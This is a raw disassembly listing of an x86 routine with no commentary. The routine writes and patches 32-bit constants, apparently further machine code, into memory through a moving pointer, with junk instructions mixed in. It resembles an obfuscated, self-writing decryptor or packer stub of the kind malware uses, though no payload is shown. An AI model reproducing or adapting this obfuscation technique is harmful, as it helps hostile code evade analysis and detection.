  402fde:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402fe2:	0b ed                	or     %ebp,%ebp
  402fe4:	0b db                	or     %ebx,%ebx
  402fe6:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402fea:	81 02 8b 5c 24 e0    	addl   $0xe0245c8b,(%edx)
  402ff0:	0b db                	or     %ebx,%ebx
  402ff2:	33 fd                	xor    %ebp,%edi
  402ff4:	85 ce                	test   %ecx,%esi
  402ff6:	f7 d9                	neg    %ecx
  402ff8:	33 c9                	xor    %ecx,%ecx
  402ffa:	b1 04                	mov    $0x4,%cl
  402ffc:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  403000:	33 fd                	xor    %ebp,%edi
  403002:	85 ce                	test   %ecx,%esi
  403004:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  403008:	81 02 81 03 ff 33    	addl   $0x33ff0381,(%edx)
  40300e:	85 ce                	test   %ecx,%esi
  403010:	f7 d9                	neg    %ecx
  403012:	33 c0                	xor    %eax,%eax
  403014:	b0 04                	mov    $0x4,%al
  403016:	01 44 24 e0          	add    %eax,-0x20(%esp)
  40301a:	f7 d9                	neg    %ecx
  40301c:	66 85 fe             	test   %di,%si
  40301f:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  403023:	81 0b c0 33 66 33    	orl    $0x336633c0,(%ebx)
  403029:	66 85 fe             	test   %di,%si
  40302c:	0f be db             	movsbl %bl,%ebx
  40302f:	66 23 d2             	and    %dx,%dx
  403032:	33 c0                	xor    %eax,%eax
  403034:	b0 04                	mov    $0x4,%al
  403036:	01 44 24 e0          	add    %eax,-0x20(%esp)
  40303a:	0f be db             	movsbl %bl,%ebx
  40303d:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403041:	81 00 fb 66 23 e8    	addl   $0xe82366fb,(%eax)
  403047:	66 23 d2             	and    %dx,%dx
  40304a:	33 db                	xor    %ebx,%ebx
  40304c:	b3 04                	mov    $0x4,%bl
  40304e:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  403052:	8b d6                	mov    %esi,%edx
  403054:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  403058:	c7 01 93 0f be d1    	movl   $0xd1be0f93,(%ecx)
  40305e:	85 d7                	test   %edx,%edi
  403060:	33 db                	xor    %ebx,%ebx
  403062:	b3 04                	mov    $0x4,%bl
  403064:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  403068:	66 85 cb             	test   %cx,%bx
  40306b:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40306f:	81 00 33 c9 b1 04    	addl   $0x4b1c933,(%eax)
  403075:	66 33 fa             	xor    %dx,%di
  403078:	23 c5                	and    %ebp,%eax
  40307a:	8b f7                	mov    %edi,%esi
  40307c:	03 f0                	add    %eax,%esi
  40307e:	33 c0                	xor    %eax,%eax
  403080:	b0 04                	mov    $0x4,%al
  403082:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403086:	23 c5                	and    %ebp,%eax
  403088:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  40308c:	b8 01 4c 24 e0       	mov    $0xe0244c01,%eax
  403091:	ab                   	stos   %eax,%es:(%edi)
  403092:	8b f7                	mov    %edi,%esi
  403094:	03 f0                	add    %eax,%esi
  403096:	2b d8                	sub    %eax,%ebx
  403098:	85 d8                	test   %ebx,%eax
  40309a:	33 db                	xor    %ebx,%ebx
  40309c:	b3 04                	mov    $0x4,%bl
  40309e:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  4030a2:	03 f0                	add    %eax,%esi
  4030a4:	2b d8                	sub    %eax,%ebx
  4030a6:	85 d8                	test   %ebx,%eax
  4030a8:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  4030ac:	81 03 66 23 e8 8b    	addl   $0x8be82366,(%ebx)
  4030b2:	2b d8                	sub    %eax,%ebx
  4030b4:	33 c9                	xor    %ecx,%ecx
  4030b6:	b1 04                	mov    $0x4,%cl
  4030b8:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  4030bc:	85 d8                	test   %ebx,%eax
  4030be:	0f be de             	movsbl %dh,%ebx
  4030c1:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4030c5:	b8 4c 24 e0 81       	mov    $0x81e0244c,%eax
  4030ca:	ab                   	stos   %eax,%es:(%edi)
  4030cb:	0f be de             	movsbl %dh,%ebx
  4030ce:	23 c8                	and    %eax,%ecx
  4030d0:	8d b0 ed f9 40 00    	lea    0x40f9ed(%eax),%esi
  4030d6:	33 c0                	xor    %eax,%eax
  4030d8:	b0 04                	mov    $0x4,%al
  4030da:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4030de:	23 c8                	and    %eax,%ecx
  4030e0:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4030e4:	81 08 01 d7 f5 06    	orl    $0x6f5d701,(%eax)
  4030ea:	8d b0 ed f9 40 00    	lea    0x40f9ed(%eax),%esi
  4030f0:	66 23 d0             	and    %ax,%dx
  4030f3:	33 c9                	xor    %ecx,%ecx
  4030f5:	b1 04                	mov    $0x4,%cl
  4030f7:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  4030fb:	66 23 d0             	and    %ax,%dx
  4030fe:	c1 c6 02             	rol    $0x2,%esi
  403101:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  403105:	81 02 6e 81 31 05    	addl   $0x531816e,(%edx)
  40310b:	c1 c6 02             	rol    $0x2,%esi
  40310e:	33 c9                	xor    %ecx,%ecx
  403110:	b1 04                	mov    $0x4,%cl
  403112:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  403116:	0f be c8             	movsbl %al,%ecx
  403119:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40311d:	81 00 78 2a 4a 93    	addl   $0x934a2a78,(%eax)
  403123:	33 cb                	xor    %ebx,%ecx
  403125:	23 db                	and    %ebx,%ebx
  403127:	33 c9                	xor    %ecx,%ecx
  403129:	b1 04                	mov    $0x4,%cl
  40312b:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  40312f:	23 db                	and    %ebx,%ebx
  403131:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  403135:	81 01 0f be d1 33    	addl   $0x33d1be0f,(%ecx)
  40313b:	81 c5 f8 da 40 00    	add    $0x40daf8,%ebp
  403141:	33 c9                	xor    %ecx,%ecx
  403143:	b1 04                	mov    $0x4,%cl
  403145:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  403149:	66 85 df             	test   %bx,%di
  40314c:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  403150:	c7 02 d2 b2 04 01    	movl   $0x104b2d2,(%edx)
  403156:	66 2b c0             	sub    %ax,%ax
  403159:	33 db                	xor    %ebx,%ebx
  40315b:	b3 04                	mov    $0x4,%bl
  40315d:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  403161:	81 ca eb de 40 00    	or     $0x40deeb,%edx
  403167:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  40316b:	c7 02 54 24 e0 0f    	movl   $0xfe02454,(%edx)
  403171:	c1 cf 02             	ror    $0x2,%edi
  403174:	33 db                	xor    %ebx,%ebx
  403176:	b3 04                	mov    $0x4,%bl
  403178:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  40317c:	23 d2                	and    %edx,%edx
  40317e:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  403182:	c7 01 be d1 8b 44    	movl   $0x448bd1be,(%ecx)
  403188:	33 fd                	xor    %ebp,%edi
  40318a:	8d b2 7b f9 40 00    	lea    0x40f97b(%edx),%esi
  403190:	33 d2                	xor    %edx,%edx
  403192:	b2 04                	mov    $0x4,%dl
  403194:	01 54 24 e0          	add    %edx,-0x20(%esp)
  403198:	8d b2 7b f9 40 00    	lea    0x40f97b(%edx),%esi
  40319e:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  4031a2:	81 02 24 e0 81 00    	addl   $0x81e024,(%edx)
  4031a8:	66 8b dd             	mov    %bp,%bx
  4031ab:	33 c9                	xor    %ecx,%ecx
  4031ad:	b1 04                	mov    $0x4,%cl
  4031af:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  4031b3:	0f b6 c0             	movzbl %al,%eax
  4031b6:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4031ba:	b8 02 04 2e 8a       	mov    $0x8a2e0402,%eax
  4031bf:	ab                   	stos   %eax,%es:(%edi)
  4031c0:	03 dd                	add    %ebp,%ebx
  4031c2:	c1 d6 02             	rcl    $0x2,%esi
  4031c5:	66 2b ce             	sub    %si,%cx
  4031c8:	33 db                	xor    %ebx,%ebx
  4031ca:	b3 04                	mov    $0x4,%bl
  4031cc:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  4031d0:	c1 d6 02             	rcl    $0x2,%esi
  4031d3:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4031d7:	b8 8b ff 81 e2       	mov    $0xe281ff8b,%eax
  4031dc:	ab                   	stos   %eax,%es:(%edi)
  4031dd:	66 2b ce             	sub    %si,%cx
  4031e0:	33 db                	xor    %ebx,%ebx
  4031e2:	b3 04                	mov    $0x4,%bl
  4031e4:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  4031e8:	f7 d3                	not    %ebx
  4031ea:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  4031ee:	81 0b e8 dd 40 00    	orl    $0x40dde8,(%ebx)
  4031f4:	83 d9 02             	sbb    $0x2,%ecx
  4031f7:	66 85 fb             	test   %di,%bx
  4031fa:	33 d2                	xor    %edx,%edx
  4031fc:	b2 04                	mov    $0x4,%dl
  4031fe:	01 54 24 e0          	add    %edx,-0x20(%esp)
  403202:	66 85 fb             	test   %di,%bx
  403205:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403209:	81 00 33 c9 b1 04    	addl   $0x4b1c933,(%eax)
  40320f:	66 2b c5             	sub    %bp,%ax
  403212:	33 c9                	xor    %ecx,%ecx
  403214:	b1 04                	mov    $0x4,%cl
  403216:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  40321a:	8d b1 fc dc 40 00    	lea    0x40dcfc(%ecx),%esi
  403220:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  403224:	81 02 01 4c 24 e0    	addl   $0xe0244c01,(%edx)
  40322a:	0f be c5             	movsbl %ch,%eax
  40322d:	0f b6 df             	movzbl %bh,%ebx
  403230:	33 db                	xor    %ebx,%ebx
  403232:	b3 04                	mov    $0x4,%bl
  403234:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  403238:	0f b6 df             	movzbl %bh,%ebx
  40323b:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  40323f:	81 01 81 e2 e8 dd    	addl   $0xdde8e281,(%ecx)
  403245:	0f ac c0 03          	shrd   $0x3,%eax,%eax
  403249:	33 c0                	xor    %eax,%eax
  40324b:	b0 04                	mov    $0x4,%al
  40324d:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403251:	66 8b de             	mov    %si,%bx
  403254:	23 f5                	and    %ebp,%esi
  403256:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40325a:	81 00 40 00 8b 4c    	addl   $0x4c8b0040,(%eax)
  403260:	23 f5                	and    %ebp,%esi
  403262:	8d 68 02             	lea    0x2(%eax),%ebp
  403265:	33 c9                	xor    %ecx,%ecx
  403267:	b1 04                	mov    $0x4,%cl
  403269:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  40326d:	8d 68 02             	lea    0x2(%eax),%ebp
  403270:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403274:	81 00 24 e0 81 01    	addl   $0x181e024,(%eax)
  40327a:	33 e9                	xor    %ecx,%ebp
  40327c:	33 c9                	xor    %ecx,%ecx
  40327e:	b1 04                	mov    $0x4,%cl
  403280:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  403284:	8d 75 02             	lea    0x2(%ebp),%esi
  403287:	33 fb                	xor    %ebx,%edi
  403289:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  40328d:	81 02 49 95 3d bb    	addl   $0xbb3d9549,(%edx)
  403293:	33 fb                	xor    %ebx,%edi
  403295:	8d 90 6a fe 40 00    	lea    0x40fe6a(%eax),%edx
  40329b:	33 db                	xor    %ebx,%ebx
  40329d:	b3 04                	mov    $0x4,%bl
  40329f:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  4032a3:	8d 90 6a fe 40 00    	lea    0x40fe6a(%eax),%edx
  4032a9:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4032ad:	81 00 81 31 5d 8d    	addl   $0x8d5d3181,(%eax)
  4032b3:	f7 d1                	not    %ecx
  4032b5:	0f b6 d6             	movzbl %dh,%edx
  4032b8:	b8 7d df 40 00       	mov    $0x40df7d,%eax
  4032bd:	33 d2                	xor    %edx,%edx
  4032bf:	b2 04                	mov    $0x4,%dl
  4032c1:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4032c5:	0f b6 d6             	movzbl %dh,%edx
  4032c8:	b8 7d df 40 00       	mov    $0x40df7d,%eax
  4032cd:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  4032d1:	81 0b b7 b7 f7 c1    	orl    $0xc1f7b7b7,(%ebx)
  4032d7:	b8 7d df 40 00       	mov    $0x40df7d,%eax
  4032dc:	33 db                	xor    %ebx,%ebx
  4032de:	b3 04                	mov    $0x4,%bl
  4032e0:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  4032e4:	03 c5                	add    %ebp,%eax
  4032e6:	8d 80 7d fd 40 00    	lea    0x40fd7d(%eax),%eax
  4032ec:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4032f0:	81 01 ff f8 40 00    	addl   $0x40f8ff,(%ecx)
  4032f6:	8d 80 7d fd 40 00    	lea    0x40fd7d(%eax),%eax
  4032fc:	33 d2                	xor    %edx,%edx
  4032fe:	b2 04                	mov    $0x4,%dl
  403300:	01 54 24 e0          	add    %edx,-0x20(%esp)
  403304:	c1 c1 02             	rol    $0x2,%ecx
  403307:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  40330b:	b8 66 2b e8 33       	mov    $0x33e82b66,%eax
  403310:	ab                   	stos   %eax,%es:(%edi)
  403311:	85 c6                	test   %eax,%esi
  403313:	c1 e1 02             	shl    $0x2,%ecx
  403316:	66 2b cf             	sub    %di,%cx
  403319:	33 db                	xor    %ebx,%ebx
  40331b:	b3 04                	mov    $0x4,%bl
  40331d:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  403321:	c1 e1 02             	shl    $0x2,%ecx
  403324:	66 2b cf             	sub    %di,%cx
  403327:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  40332b:	b8 db b3 04 01       	mov    $0x104b3db,%eax
  403330:	ab                   	stos   %eax,%es:(%edi)
  403331:	66 2b cf             	sub    %di,%cx
  403334:	33 db                	xor    %ebx,%ebx
  403336:	b3 04                	mov    $0x4,%bl
  403338:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  40333c:	8b e8                	mov    %eax,%ebp
  40333e:	23 fa                	and    %edx,%edi
  403340:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403344:	81 08 5c 24 e0 66    	orl    $0x66e0245c,(%eax)
  40334a:	23 fa                	and    %edx,%edi
  40334c:	8d 6e 02             	lea    0x2(%esi),%ebp
  40334f:	33 c0                	xor    %eax,%eax
  403351:	b0 04                	mov    $0x4,%al
  403353:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403357:	8d 6e 02             	lea    0x2(%esi),%ebp
  40335a:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40335e:	81 00 2b e8 0f b6    	addl   $0xb60fe82b,(%eax)
  403364:	23 db                	and    %ebx,%ebx
  403366:	33 c9                	xor    %ecx,%ecx
  403368:	b1 04                	mov    $0x4,%cl
  40336a:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  40336e:	66 03 e9             	add    %cx,%bp
  403371:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403375:	68 cd 8b 5c 24       	push   $0x245c8bcd
  40337a:	8b f4                	mov    %esp,%esi
  40337c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40337d:	58                   	pop    %eax
  40337e:	66 8b c0             	mov    %ax,%ax
  403381:	33 c0                	xor    %eax,%eax
  403383:	b0 04                	mov    $0x4,%al
  403385:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403389:	66 8b f0             	mov    %ax,%si
  40338c:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403390:	81 00 e0 81 03 18    	addl   $0x180381e0,(%eax)
  403396:	66 0b ef             	or     %di,%bp
  403399:	33 c0                	xor    %eax,%eax
  40339b:	b0 04                	mov    $0x4,%al
  40339d:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4033a1:	66 03 e9             	add    %cx,%bp
  4033a4:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4033a8:	68 bb e7 39 81       	push   $0x8139e7bb
  4033ad:	8b f4                	mov    %esp,%esi
  4033af:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4033b0:	58                   	pop    %eax
  4033b1:	8b fb                	mov    %ebx,%edi
  4033b3:	66 85 c8             	test   %cx,%ax
  4033b6:	33 c0                	xor    %eax,%eax
  4033b8:	b0 04                	mov    $0x4,%al
  4033ba:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4033be:	66 85 c8             	test   %cx,%ax
  4033c1:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4033c5:	b8 33 07 33 eb       	mov    $0xeb330733,%eax
  4033ca:	ab                   	stos   %eax,%es:(%edi)
  4033cb:	23 de                	and    %esi,%ebx
  4033cd:	33 c9                	xor    %ecx,%ecx
  4033cf:	b1 04                	mov    $0x4,%cl
  4033d1:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  4033d5:	0b fd                	or     %ebp,%edi
  4033d7:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4033db:	81 00 21 0f b6 cd    	addl   $0xcdb60f21,(%eax)
  4033e1:	03 f5                	add    %ebp,%esi
  4033e3:	85 f1                	test   %esi,%ecx
  4033e5:	66 33 df             	xor    %di,%bx
  4033e8:	8d 90 6a fe 40 00    	lea    0x40fe6a(%eax),%edx
  4033ee:	33 c0                	xor    %eax,%eax
  4033f0:	b0 04                	mov    $0x4,%al
  4033f2:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4033f6:	85 f1                	test   %esi,%ecx
  4033f8:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  4033fc:	81 0a 33 db b3 04    	orl    $0x4b3db33,(%edx)
  403402:	66 33 df             	xor    %di,%bx
  403405:	33 c0                	xor    %eax,%eax
  403407:	b0 04                	mov    $0x4,%al
  403409:	01 44 24 e0          	add    %eax,-0x20(%esp)
  40340d:	8d 90 6a fe 40 00    	lea    0x40fe6a(%eax),%edx
  403413:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403417:	81 00 01 5c 24 e0    	addl   $0xe0245c01,(%eax)
  40341d:	0f be db             	movsbl %bl,%ebx
  403420:	33 c0                	xor    %eax,%eax
  403422:	b0 04                	mov    $0x4,%al
  403424:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403428:	66 03 df             	add    %di,%bx
  40342b:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  40342f:	b8 23 d3 0f be       	mov    $0xbe0fd323,%eax
  403434:	ab                   	stos   %eax,%es:(%edi)
  403435:	23 cb                	and    %ebx,%ecx
  403437:	0f be de             	movsbl %dh,%ebx
  40343a:	33 c0                	xor    %eax,%eax
  40343c:	b0 04                	mov    $0x4,%al
  40343e:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403442:	0f be de             	movsbl %dh,%ebx
  403445:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403449:	68 c2 8b 54 24       	push   $0x24548bc2
  40344e:	8b f4                	mov    %esp,%esi
  403450:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403451:	58                   	pop    %eax
  403452:	66 2b c2             	sub    %dx,%ax
  403455:	0b d7                	or     %edi,%edx
  403457:	c1 ff 02             	sar    $0x2,%edi
  40345a:	33 d2                	xor    %edx,%edx
  40345c:	b2 04                	mov    $0x4,%dl
  40345e:	01 54 24 e0          	add    %edx,-0x20(%esp)
  403462:	0b d7                	or     %edi,%edx
  403464:	c1 ff 02             	sar    $0x2,%edi
  403467:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  40346b:	c7 01 e0 81 02 a6    	movl   $0xa60281e0,(%ecx)
  403471:	c1 ff 02             	sar    $0x2,%edi
  403474:	85 ee                	test   %ebp,%esi
  403476:	33 c0                	xor    %eax,%eax
  403478:	b0 04                	mov    $0x4,%al
  40347a:	01 44 24 e0          	add    %eax,-0x20(%esp)
  40347e:	85 ee                	test   %ebp,%esi
  403480:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403484:	81 00 99 75 b5 81    	addl   $0x81b57599,(%eax)
  40348a:	66 0b e9             	or     %cx,%bp
  40348d:	33 c0                	xor    %eax,%eax
  40348f:	b0 04                	mov    $0x4,%al
  403491:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403495:	66 03 f0             	add    %ax,%si
  403498:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40349c:	81 08 32 2e 8d 6a    	orl    $0x6a8d2e32,(%eax)
  4034a2:	85 f6                	test   %esi,%esi
  4034a4:	23 f5                	and    %ebp,%esi
  4034a6:	66 03 e9             	add    %cx,%bp
  4034a9:	33 c0                	xor    %eax,%eax
  4034ab:	b0 04                	mov    $0x4,%al
  4034ad:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4034b1:	23 f5                	and    %ebp,%esi
  4034b3:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4034b7:	81 09 f2 0f be c2    	orl    $0xc2be0ff2,(%ecx)
  4034bd:	66 03 e9             	add    %cx,%bp
  4034c0:	33 c0                	xor    %eax,%eax
  4034c2:	b0 04                	mov    $0x4,%al
  4034c4:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4034c8:	66 03 e9             	add    %cx,%bp
  4034cb:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4034cf:	68 2b f9 83 c0       	push   $0xc083f92b
  4034d4:	8b f4                	mov    %esp,%esi
  4034d6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4034d7:	58                   	pop    %eax
  4034d8:	66 03 e9             	add    %cx,%bp
  4034db:	33 c0                	xor    %eax,%eax
  4034dd:	b0 04                	mov    $0x4,%al
  4034df:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4034e3:	66 03 e9             	add    %cx,%bp
  4034e6:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4034ea:	68 02 33 d2 b2       	push   $0xb2d23302
  4034ef:	8b f4                	mov    %esp,%esi
  4034f1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4034f2:	58                   	pop    %eax
  4034f3:	2b fd                	sub    %ebp,%edi
  4034f5:	66 23 d6             	and    %si,%dx
  4034f8:	33 c0                	xor    %eax,%eax
  4034fa:	b0 04                	mov    $0x4,%al
  4034fc:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403500:	66 23 d6             	and    %si,%dx
  403503:	66 03 e9             	add    %cx,%bp
  403506:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40350a:	81 08 04 01 54 24    	orl    $0x24540104,(%eax)
  403510:	66 03 e9             	add    %cx,%bp
  403513:	33 c0                	xor    %eax,%eax
  403515:	b0 04                	mov    $0x4,%al
  403517:	01 44 24 e0          	add    %eax,-0x20(%esp)
  40351b:	66 03 e9             	add    %cx,%bp
  40351e:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403522:	68 e0 2b f9 8b       	push   $0x8bf92be0
  403527:	8b f4                	mov    %esp,%esi
  403529:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40352a:	58                   	pop    %eax
  40352b:	66 03 e9             	add    %cx,%bp
  40352e:	33 c0                	xor    %eax,%eax
  403530:	b0 04                	mov    $0x4,%al
  403532:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403536:	66 03 e9             	add    %cx,%bp
  403539:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  40353d:	68 44 24 e0 81       	push   $0x81e02444
  403542:	8b f4                	mov    %esp,%esi
  403544:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403545:	58                   	pop    %eax
  403546:	66 2b c7             	sub    %di,%ax
  403549:	0f ac d8 03          	shrd   $0x3,%ebx,%eax
  40354d:	2b f0                	sub    %eax,%esi
  40354f:	33 c0                	xor    %eax,%eax
  403551:	b0 04                	mov    $0x4,%al
  403553:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403557:	0f ac d8 03          	shrd   $0x3,%ebx,%eax
  40355b:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40355f:	81 00 00 46 83 fe    	addl   $0xfe834600,(%eax)
  403565:	2b f0                	sub    %eax,%esi
  403567:	66 85 c3             	test   %ax,%bx
  40356a:	33 c9                	xor    %ecx,%ecx
  40356c:	b1 04                	mov    $0x4,%cl
  40356e:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  403572:	66 85 c3             	test   %ax,%bx
  403575:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403579:	81 00 10 83 c0 02    	addl   $0x2c08310,(%eax)
  40357f:	0f b6 c4             	movzbl %ah,%eax
  403582:	c1 d7 02             	rcl    $0x2,%edi
  403585:	0b cb                	or     %ebx,%ecx
  403587:	33 c0                	xor    %eax,%eax
  403589:	b0 04                	mov    $0x4,%al
  40358b:	01 44 24 e0          	add    %eax,-0x20(%esp)
  40358f:	c1 d7 02             	rcl    $0x2,%edi
  403592:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403596:	81 08 33 ca 66 8b    	orl    $0x8b66ca33,(%eax)
  40359c:	0b cb                	or     %ebx,%ecx
  40359e:	66 2b ed             	sub    %bp,%bp
  4035a1:	33 d2                	xor    %edx,%edx
  4035a3:	b2 04                	mov    $0x4,%dl
  4035a5:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4035a9:	66 2b ed             	sub    %bp,%bp
  4035ac:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4035b0:	c7 00 f9 33 c0 b0    	movl   $0xb0c033f9,(%eax)
  4035b6:	66 03 e9             	add    %cx,%bp
  4035b9:	33 c0                	xor    %eax,%eax
  4035bb:	b0 04                	mov    $0x4,%al
  4035bd:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4035c1:	66 03 e9             	add    %cx,%bp
  4035c4:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4035c8:	68 04 01 44 24       	push   $0x24440104
  4035cd:	8b f4                	mov    %esp,%esi
  4035cf:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4035d0:	58                   	pop    %eax
  4035d1:	66 0b f9             	or     %cx,%di
  4035d4:	03 c0                	add    %eax,%eax
  4035d6:	33 c0                	xor    %eax,%eax
  4035d8:	b0 04                	mov    $0x4,%al
  4035da:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4035de:	03 c0                	add    %eax,%eax
  4035e0:	66 8b cd             	mov    %bp,%cx
  4035e3:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4035e7:	81 00 e0 33 ca 8b    	addl   $0x8bca33e0,(%eax)
  4035ed:	66 8b cd             	mov    %bp,%cx
  4035f0:	0f c1 e8             	xadd   %ebp,%eax
  4035f3:	66 03 e9             	add    %cx,%bp
  4035f6:	33 c0                	xor    %eax,%eax
  4035f8:	b0 04                	mov    $0x4,%al
  4035fa:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4035fe:	0f c1 e8             	xadd   %ebp,%eax
  403601:	66 03 e9             	add    %cx,%bp
  403604:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403608:	81 08 54 24 e0 81    	orl    $0x81e02454,(%eax)
  40360e:	66 03 e9             	add    %cx,%bp
  403611:	33 c0                	xor    %eax,%eax
  403613:	b0 04                	mov    $0x4,%al
  403615:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403619:	66 03 e9             	add    %cx,%bp
  40361c:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403620:	68 02 75 02 33       	push   $0x33027502
  403625:	8b f4                	mov    %esp,%esi
  403627:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403628:	58                   	pop    %eax
  403629:	33 d9                	xor    %ecx,%ebx
  40362b:	33 c0                	xor    %eax,%eax
  40362d:	b0 04                	mov    $0x4,%al
  40362f:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403633:	66 2b f2             	sub    %dx,%si
  403636:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40363a:	81 08 f6 66 8b f9    	orl    $0xf98b66f6,(%eax)
  403640:	66 03 e9             	add    %cx,%bp
  403643:	33 c0                	xor    %eax,%eax
  403645:	b0 04                	mov    $0x4,%al
  403647:	01 44 24 e0          	add    %eax,-0x20(%esp)
  40364b:	66 03 e9             	add    %cx,%bp
  40364e:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403652:	68 33 c0 b0 04       	push   $0x4b0c033
  403657:	8b f4                	mov    %esp,%esi
  403659:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40365a:	58                   	pop    %eax
  40365b:	33 d9                	xor    %ecx,%ebx
  40365d:	33 c0                	xor    %eax,%eax
  40365f:	b0 04                	mov    $0x4,%al
  403661:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403665:	66 2b f2             	sub    %dx,%si
  403668:	8b 44 24 e0          	mov    -0x20(%esp),%eax
